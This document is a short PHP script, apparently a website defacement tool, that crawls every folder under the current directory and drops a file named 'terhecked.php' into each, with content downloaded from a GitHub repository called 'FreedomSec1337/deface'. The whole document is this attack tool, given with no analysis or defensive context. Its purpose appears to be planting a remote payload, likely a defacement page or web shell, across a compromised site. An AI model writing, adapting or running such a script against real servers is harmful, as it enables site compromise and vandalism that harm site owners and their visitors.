<?php
$targetFile = "terhecked.php";
$sourceUrl = "https://raw.githubusercontent.com/FreedomSec1337/deface/refs/heads/main/terge.txt";

function createFileRecursive($dir, $depth = 0) {
    global $targetFile, $sourceUrl;

    $indent = str_repeat("  ", $depth);
    echo $indent . "Scanning folder: $dir\n";

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($path)) {
            createFileRecursive($path, $depth + 1);
        }
    }

    $filePath = $dir . DIRECTORY_SEPARATOR . $targetFile;
    if (!file_exists($filePath)) {
        $content = @file_get_contents($sourceUrl);
        if ($content === false) {
            echo $indent . "  [!] Failed to fetch content from URL\n";
            return;
        }
        file_put_contents($filePath, $content);
        echo $indent . "  [+] Created: $filePath\n";
    } else {
        echo $indent . "  [-] Exists: $filePath\n";
    }
}

echo "=== Starting mass file creation ===\n";
createFileRecursive(getcwd());
echo "=== Done ===\n";
?>
